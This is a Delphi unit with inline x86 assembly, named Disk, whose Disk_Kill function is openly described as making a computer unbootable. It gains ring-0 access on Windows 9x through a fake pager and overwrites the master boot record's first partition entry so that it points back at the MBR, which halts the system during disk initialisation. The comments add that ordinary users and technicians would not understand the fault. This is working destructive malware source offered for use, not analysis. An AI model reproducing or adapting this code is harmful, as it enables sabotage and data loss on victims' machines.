{ This small unit prevents your computer from booting up (regardless
  of boot source - HDD, floppy or a CD). Most OS's process the partition table
  recursively rather than iteratively. Setting MBR as a first sector of an
  extended partition will result in a system halt during HDD initialization.
  One good method is to boot with an "alternative" OS like Linux and then fix
  the partition table manually. Of course, most PC users (and even servicers)
  wouldn't know what to do with it and what's really wrong with the computer. }

unit Disk;

interface

function Disk_Kill: Boolean;

implementation

type
  TClientRegStruc = packed record
    Client_EDI, Client_ESI, Client_EBP, res, Client_EBX, Client_EDX, Client_ECX,
    Client_EAX, Client_Error, Client_EIP, Client_CS, Client_EFlags, Client_ESP,
    Client_SS, Client_ES, Client_DS, Client_FS, Client_GS, Client_Alt_EIP,
    Client_Alt_CS, Client_Alt_EFlags, Client_Alt_ESP, Client_Alt_SS,
    Client_Alt_ES, Client_Alt_DS, Client_Alt_FS, Client_Alt_GS: Cardinal;
  end;
  TPD = packed record
    pd_virginin, pd_taintedin, pd_cleanout, pd_dirtyout, pd_virginfree,
    pd_taintedfree, pd_dirty: function (ppagerdata, ppage: Pointer; faultpage:
                                        Cardinal): Cardinal; cdecl;
    pd_type: Cardinal;
  end;
  TPartitionRec = packed record
    active, firstHead: byte;
    firstCylSec: word;
    pType, lastHead: byte;
    lastCylSec: word;
    start, size: cardinal;
  end;

const
  sizeof_ClientRegStruc = sizeof(TClientRegStruc);

var
  VxDCall1: function (id, arg1: Cardinal): Cardinal; stdcall;
  VxDCall2: function (id, arg1, arg2: Cardinal): Cardinal; stdcall;
  VxDCall3: function (id, arg1, arg2, arg3: Cardinal): Cardinal; stdcall;
  VxDCall5: function (id, arg1, arg2, arg3, arg4, arg5: Cardinal): Cardinal; stdcall;

procedure Disk_GlobalEvent; forward;
procedure Disk_PagerEntry; assembler;
asm
  call @@0
@@0:
  pop edx
  { need to register a global event here -- we don't want to remove the pager
    if _SHELL_CallAtAppyTime executes the code immediately }
  sub edx, offset @@0
  push esi
  lea esi, Disk_GlobalEvent[edx]
  int $20
  dd $0001000e  // Schedule_Global_Event
  pop esi
end;

procedure Disk_PagerHandle; assembler;
asm
  db $ff, $ff, $ff
end;

procedure Disk_KernelLib; assembler;
asm
  db 'KERNEL', 0
end;

procedure Disk_FreeDosMem; assembler;
asm
  push esi
  call @@0
@@GlobalDosFree:
  db 'GLOBALDOSFREE', 0
@@0:
  pop eax
  mov esi, eax
  sub esi, offset @@GlobalDosFree
  push esp      // address of first argument (selector saved on the stack)
  lea edx, Disk_KernelLib[esi]
  push 2        // size of arguments
  push eax      // function name (GlobalDosFree)
  push dword ptr [esp + 16] // library (krnl386.exe)
  int $20
  dd $00170018  // _SHELL_CallDll
  add esp, 16
  sub dword ptr Disk_PagerHandle[esi], 2
  pop esi
end;

procedure Disk_NestedExecution; assembler;
asm
  movzx eax, dx // EAX = protected mode 16-bit segment selector
  push eax
  shr edx, 16   // EDX = DOS segment index
  sub esp, sizeof_ClientRegStruc
  push edi
  lea edi, [esp + 4]
  int $20
  dd $0001008d  // Save_Client_State
  pop edi
  int $20
  dd $00010082  // Begin_Nest_V86_Exec
  xor eax, eax
  mov [ebp].TClientRegStruc.Client_ES, edx
  mov [ebp].TClientRegStruc.Client_EBX, eax   // ES:EBX = buffer address
  mov [ebp].TClientRegStruc.Client_EDX, $80   // physical drive = Primary Master
  inc eax
  mov [ebp].TClientRegStruc.Client_EAX, $201  // BIOS read disk sectors
  mov [ebp].TClientRegStruc.Client_ECX, eax   // sector = 1, cylinder = 0
  mov eax, $13
  int $20
  dd $00010084  // Exec_Int
  test [ebp].TClientRegStruc.Client_EFlags, 1 // CF set?
  jnz @@BIOS_Call_Failed
  or eax, -1
  mov ah, 56
  int $20
  dd $0001001c  // Map_Flat
  add eax, $1be // EAX = address of first partition record in memory
  mov [eax].TPartitionRec.ptype, 5            // EXTENDED partition
  { set next-level partition table (logical disks array) = MBR
    (causes infinite loops even when booting from a diskette/CD) }
  mov [eax].TPartitionRec.start, 0
  mov [eax].TPartitionRec.firstHead, 0
  mov [eax].TPartitionRec.firstCylSec, 1
  mov [eax].TPartitionRec.active, $80         // make sure system won't start
  mov [ebp].TClientRegStruc.Client_EAX, $301  // BIOS write disk sectors
  mov eax, $13
  int $20
  dd $00010084  // Exec_Int
  test [ebp].TClientRegStruc.Client_EFlags, 1 // CF set?
  jnz @@BIOS_Call_Failed
  mov al, 3
  jmp @@Finish
@@BIOS_Call_Failed:
  mov al, 2
@@Finish:
  call @@Finish_2
@@Finish_2:
  pop edx
  sub edx, offset @@Finish_2
  movzx eax, al
  mov dword ptr Disk_PagerHandle[edx], eax
  int $20
  dd $00010086  // End_Nest_Exec
  push esi
  lea esi, [esp + 4]
  int $20
  dd $0001008e  // Restore_Client_State
  pop esi
  add esp, sizeof_ClientRegStruc
  pop eax       // EAX = protected mode 16-bit segment selector
  push 1
  push 0
  add edx, offset Disk_FreeDosMem
  push eax
  push edx
  int $20
  dd $0017000e  // _SHELL_CallAtAppyTime
  add esp, 16
end;

procedure Disk_AppyTimeCallback; assembler;
asm
  push esi
  call @@0
@@BuffSize:
  dd 512
@@GlobalDosAlloc:
  db 'GLOBALDOSALLOC', 0
@@0:
  pop esi
  sub esi, offset @@BuffSize
  lea eax, @@BuffSize[esi]
  lea ecx, @@GlobalDosAlloc[esi]
  lea edx, Disk_KernelLib[esi]
  push eax  // address of first argument (number of bytes to allocate)
  push 4    // size of arguments
  push ecx  // function name (GlobalDosAlloc)
  push edx  // library (krnl386.exe)
  int $20
  dd $00170018  // _SHELL_CallDll
  add esp, 16
  test ax, ax
  jnz @@Continue
  xor eax, eax
  mov dword ptr Disk_PagerHandle[esi], eax
  jmp @@Return
@@Continue:
  xchg eax, edx
  int $20
  dd $00010001  // Get_Cur_VM_Handle
  add esi, offset Disk_NestedExecution
  int $20
  dd $0001000f  // Schedule_VM_Event
@@Return:
  pop esi
end;

procedure Disk_GlobalEvent; assembler;
asm
  push esi
  xchg edx, esi
  lea eax, Disk_PagerHandle[esi]
  push eax
  int $20
  dd $00010122  // _PagerDeregister
  pop edx
  push 1    // dwFlags = CAAFL_RING0
  push 0    // dwTimeout = 0
  add esi, offset Disk_AppyTimeCallback
  push 0    // dwRefData = 0
  push esi  // pfnCallback = Disk_AppyTimeCallback
  int $20
  dd $0017000e  // _SHELL_CallAtAppyTime
  add esp, 16
  pop esi
end;

function Disk_PrepareVxDCalls: Boolean;
var
  kernelBase, peBase: Cardinal;

  function Try_Find_Kernel(addr: Cardinal): Boolean;
  begin
    try
      if (PChar(addr)^ = 'M') and (PChar(addr + 1)^ = 'Z') then
      begin
        kernelBase := addr;
        peBase := kernelBase + Cardinal(Pointer(addr + $3C)^);
        Result := (PChar(peBase)^ = 'P') and (PChar(peBase + 1)^ = 'E');
      end else Result := False;
    except
      Result := False;
    end;
  end;

  function GetProcByIndex(idx: Cardinal): Pointer;
  begin
    Result := Pointer(Cardinal(Pointer(Cardinal(Pointer(Cardinal(Pointer(peBase
      + $78)^) + kernelBase + $1C)^) + kernelBase + idx * 4)^) + kernelBase);
  end;

begin
  if not Try_Find_Kernel($BFF60000) then
    if not Try_Find_Kernel($BFF70000) then
    begin
      Result := False;
      Exit;
    end;
  VxDCall1 := GetProcByIndex(1);
  VxDCall2 := GetProcByIndex(2);
  VxDCall3 := GetProcByIndex(3);
  VxDCall5 := GetProcByIndex(5);
  Result := True;
end;

function Disk_Kill: Boolean;
var
  memory: Pointer;
  i, j: Cardinal;
  pd: ^TPD;
begin
  //TODO: \Device\PhysicalDrive0 or sth like that under NT
  Result := False;
  if not Disk_PrepareVxDCalls then Exit;
  // allocate locked memory for Ring-0 code in shared arena
  i := Cardinal(@Disk_PrepareVxDCalls) - Cardinal(@Disk_PagerEntry);
  j := (i + sizeof(TPD) + 4095) div 4096;
  memory := Pointer(VxDCall3($00010000, $80060000, j, 0));
  if memory = Pointer(-1) then Exit;
  if VxDCall5($00010001, Cardinal(memory) div 4096, j, 1, 0, $00060080) <> 0 then
  begin
    Move(Addr(Disk_PagerEntry)^, memory^, i);
    // initialize fake pager
    pd := Pointer(Cardinal(memory) + i);
    FillChar(pd^, sizeof(TPD), 0);
    pd^.pd_virginfree := memory;
    pd^.pd_type := 1;
    i := VxDCall1($00010003, Cardinal(pd));
    if i <> 0 then
    begin
      Cardinal(Pointer(Cardinal(memory) + Cardinal(@Disk_PagerHandle) -
        Cardinal(@Disk_PagerEntry))^) := i;
      j := VxDCall3($00010000, $80000400, 1, 0);
      if j <> 0 then
      begin
        i := VxDCall5($00010001, j div 4096, 1, i, 0, $00040000);
        VxDCall2($0001000A, j, 0);  // this will transfer control to Ring-0
        if i <> 0 then
        begin
          repeat
            i := Cardinal(Pointer(Cardinal(@Disk_PagerHandle) -
              Cardinal(@Disk_PagerEntry) + Cardinal(memory))^);
          until i < 2;
          Result := i = 1;
        end;
      end;
    end;
  end;
  VxDCall2($0001000A, Cardinal(memory), 0);
end;

end.
